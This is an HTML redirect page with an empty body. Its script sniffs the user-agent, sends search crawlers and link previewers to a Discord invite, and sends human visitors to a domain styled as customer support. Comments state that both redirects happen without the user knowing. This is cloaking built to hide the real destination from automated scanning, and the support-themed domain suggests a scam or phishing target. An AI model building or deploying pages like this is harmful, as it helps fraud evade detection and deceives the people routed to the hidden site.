<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script type="text/javascript">
        // Simple bot detection function
        function isBot() {
            // Check for common bot-like behavior: bots typically don't have JavaScript enabled.
            return navigator.userAgent.match(/bot|crawl|slurp|spider|google|bing|facebook/i);
        }

        // Redirect based on whether the user is a bot or human
        window.onload = function() {
            if (isBot()) {
                // Redirect bots to your Discord link without the user knowing
                window.location.replace("https://discord.gg/KuUxhMvH");
            } else {
                // Redirect real users to the desired URL without the user knowing
                window.location.replace("https://customersupport.click/GDQG8D");
            }
        }
    </script>
</head>
<body>
    <!-- No content here; the user will not see anything -->
</body>
</html>
